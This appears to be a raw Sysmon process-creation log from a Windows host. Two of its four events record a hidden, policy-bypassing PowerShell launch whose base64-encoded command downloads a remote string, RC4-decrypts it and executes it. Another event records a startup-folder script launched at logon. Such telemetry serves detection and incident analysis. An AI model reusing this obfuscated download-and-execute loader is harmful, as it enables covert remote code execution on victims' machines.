<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-03-24T15:11:49.227455600Z'/><EventRecordID>5613964</EventRecordID><Correlation/><Execution ProcessID='2992' ThreadID='3928'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-3</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-03-24 15:11:49.226</Data><Data Name='ProcessGuid'>{e8747bb8-7635-67e1-3964-000000004103}</Data><Data Name='ProcessId'>1204</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"                                                                                                                                                                                                                                                                                                                                 -WindowStyle hidden -ep bypas -enc ZgB1AG4AYwB0AGkAbwBuACAAYQBuAGEAbABpAHQAeQBjAGEAbABfAGQAYQB0AGEAKAAkAGQAYQB0AGEAKQAgAHsADQAKACAAIAAgACAAJABrAGUAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAiAGoAaQAzADIAawA3AGEAdQA0AGEAOAAzACIAKQANAAoAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZABhAHQAYQApAA0ACgANAAoAIAAgACAAIAAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEwAZQBuAGcAdABoAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQANAAoAIAAgACAAIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoACgAJgAgACQAUgAgACQAZABhAHQAYQAgACQAawBlAHkAKQApACAAfAAgAGkAZQB4AA0ACgB9AA0ACgANAAoAJABhAHAAaQBfAGsAZQB5ACAAPQAgACIAewAwAH0AewAxAH0AewAxAH0AewAzAH0AewA0AH0AewA1AH0AewA2AH0AewA2AH0AewAyADYAfQB7ADIANQB9AHsAOAB9AHsAMQAxAH0AewAxADIAfQB7ADMAMwB9AHsAMQB9AHsAMAB9AHsANAA1AH0AewAzADIAfQB7ADQANQB9AHsANAB9AHsAMQA3AH0AewAyADYAfQB7ADEAOQB9AHsAMQAzAH0AewAzADgAfQB7ADEAfQB7ADEANwB9AHsAMwA4AH0AewAxAH0AewAxADEAfQB7ADEAOQB9AHsAMQAzAH0AewAyADEAfQB7ADYAfQB7ADEANgB9AHsANQA5AH0AewA4AH0AewA0ADQAfQB7ADMAOAB9AHsAMQAyAH0AewA2AH0AewAxADkAfQB7ADEANwB9AHsANAB9AHsAMAB9AHsAMwAzAH0AewA2AH0AewAyADEAfQB7ADIANQB9AHsAMwAzAH0AewAzADgAfQB7ADYAfQB7ADIANQB9AHsAMQAxAH0AewAxAH0AewA1ADcAfQB7ADEAfQAiAA0ACgAkAHUAcgBsACAAPQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZwBvAG8AZwBsAGUALgBjAG8AbQAvAHMAZQBhAHIAYwBoAD8AcQA9AGIAaQB0AGMAbwBpAG4AJQAyADAAJQAyADQAdQBzAGQAJQAyADAAdwBvAHIAdABoACYAeAA9ADEAIgANAAoADQAKACQAdQByAGwAIAA9ACAAJABhAHAAaQBfAGsAZQB5ACAALQBmAEAAKAAkAHUAcgBsACkALgBUAG8AQwBoAGEAcgBBAHIAcgBhAHkAKAApAA0ACgANAAoAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAdQByAGwAKQANAAoAYQBuAGEAbABpAHQAeQBjAGEAbABfAGQAYQB0AGEAIAAkAGQAYQB0AGEA</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\Desktop\</Data><Data Name='User'>AR-WIN-3\Administrator</Data><Data Name='LogonGuid'>{e8747bb8-6cb6-67e1-29a5-040700000000}</Data><Data Name='LogonId'>0x704a529</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C</Data><Data Name='ParentProcessGuid'>{e8747bb8-6cb9-67e1-2463-000000004103}</Data><Data Name='ParentProcessId'>5368</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data><Data Name='ParentUser'>AR-WIN-3\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-03-24T14:49:00.306273800Z'/><EventRecordID>5597245</EventRecordID><Correlation/><Execution ProcessID='2992' ThreadID='3928'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-3</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-03-24 14:49:00.298</Data><Data Name='ProcessGuid'>{e8747bb8-70dc-67e1-a963-000000004103}</Data><Data Name='ProcessId'>3852</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </Data><Data Name='CurrentDirectory'>C:\Users\Administrator\</Data><Data Name='User'>AR-WIN-3\Administrator</Data><Data Name='LogonGuid'>{e8747bb8-6cb6-67e1-29a5-040700000000}</Data><Data Name='LogonId'>0x704a529</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C</Data><Data Name='ParentProcessGuid'>{e8747bb8-6cb9-67e1-2463-000000004103}</Data><Data Name='ParentProcessId'>5368</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data><Data Name='ParentUser'>AR-WIN-3\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-03-24T14:34:26.227690000Z'/><EventRecordID>5585441</EventRecordID><Correlation/><Execution ProcessID='2992' ThreadID='3928'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-3</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-03-24 14:34:26.226</Data><Data Name='ProcessGuid'>{e8747bb8-6d72-67e1-4d63-000000004103}</Data><Data Name='ProcessId'>5288</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"                                                                                                                                                                                                                                                                                                                                 -WindowStyle hidden -ep bypas -enc ZgB1AG4AYwB0AGkAbwBuACAAYQBuAGEAbABpAHQAeQBjAGEAbABfAGQAYQB0AGEAKAAkAGQAYQB0AGEAKQAgAHsADQAKACAAIAAgACAAJABrAGUAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAiAGoAaQAzADIAawA3AGEAdQA0AGEAOAAzACIAKQANAAoAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZABhAHQAYQApAA0ACgANAAoAIAAgACAAIAAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEwAZQBuAGcAdABoAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQANAAoAIAAgACAAIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoACgAJgAgACQAUgAgACQAZABhAHQAYQAgACQAawBlAHkAKQApACAAfAAgAGkAZQB4AA0ACgB9AA0ACgANAAoAJABhAHAAaQBfAGsAZQB5ACAAPQAgACIAewAwAH0AewAxAH0AewAxAH0AewAzAH0AewA0AH0AewA1AH0AewA2AH0AewA2AH0AewAyADYAfQB7ADIANQB9AHsAOAB9AHsAMQAxAH0AewAxADIAfQB7ADMAMwB9AHsAMQB9AHsAMAB9AHsANAA1AH0AewAzADIAfQB7ADQANQB9AHsANAB9AHsAMQA3AH0AewAyADYAfQB7ADEAOQB9AHsAMQAzAH0AewAzADgAfQB7ADEAfQB7ADEANwB9AHsAMwA4AH0AewAxAH0AewAxADEAfQB7ADEAOQB9AHsAMQAzAH0AewAyADEAfQB7ADYAfQB7ADEANgB9AHsANQA5AH0AewA4AH0AewA0ADQAfQB7ADMAOAB9AHsAMQAyAH0AewA2AH0AewAxADkAfQB7ADEANwB9AHsANAB9AHsAMAB9AHsAMwAzAH0AewA2AH0AewAyADEAfQB7ADIANQB9AHsAMwAzAH0AewAzADgAfQB7ADYAfQB7ADIANQB9AHsAMQAxAH0AewAxAH0AewA1ADcAfQB7ADEAfQAiAA0ACgAkAHUAcgBsACAAPQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZwBvAG8AZwBsAGUALgBjAG8AbQAvAHMAZQBhAHIAYwBoAD8AcQA9AGIAaQB0AGMAbwBpAG4AJQAyADAAJQAyADQAdQBzAGQAJQAyADAAdwBvAHIAdABoACYAeAA9ADEAIgANAAoADQAKACQAdQByAGwAIAA9ACAAJABhAHAAaQBfAGsAZQB5ACAALQBmAEAAKAAkAHUAcgBsACkALgBUAG8AQwBoAGEAcgBBAHIAcgBhAHkAKAApAA0ACgANAAoAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAdQByAGwAKQANAAoAYQBuAGEAbABpAHQAeQBjAGEAbABfAGQAYQB0AGEAIAAkAGQAYQB0AGEA</Data><Data Name='CurrentDirectory'>C:\Users\Administrator\Desktop\</Data><Data Name='User'>AR-WIN-3\Administrator</Data><Data Name='LogonGuid'>{e8747bb8-6cb6-67e1-29a5-040700000000}</Data><Data Name='LogonId'>0x704a529</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C</Data><Data Name='ParentProcessGuid'>{e8747bb8-6cb9-67e1-2463-000000004103}</Data><Data Name='ParentProcessId'>5368</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data><Data Name='ParentUser'>AR-WIN-3\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-03-24T14:31:36.813396000Z'/><EventRecordID>5575766</EventRecordID><Correlation/><Execution ProcessID='2992' ThreadID='3928'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-3</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-03-24 14:31:36.806</Data><Data Name='ProcessGuid'>{e8747bb8-6cc8-67e1-3063-000000004103}</Data><Data Name='ProcessId'>5588</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>C:\Windows\system32\cmd.exe /c ""C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RunWallpaperSetup.cmd" "</Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>AR-WIN-3\Administrator</Data><Data Name='LogonGuid'>{e8747bb8-6cb6-67e1-29a5-040700000000}</Data><Data Name='LogonId'>0x704a529</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527</Data><Data Name='ParentProcessGuid'>{e8747bb8-6cb9-67e1-2463-000000004103}</Data><Data Name='ParentProcessId'>5368</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data><Data Name='ParentUser'>AR-WIN-3\Administrator</Data></EventData></Event>
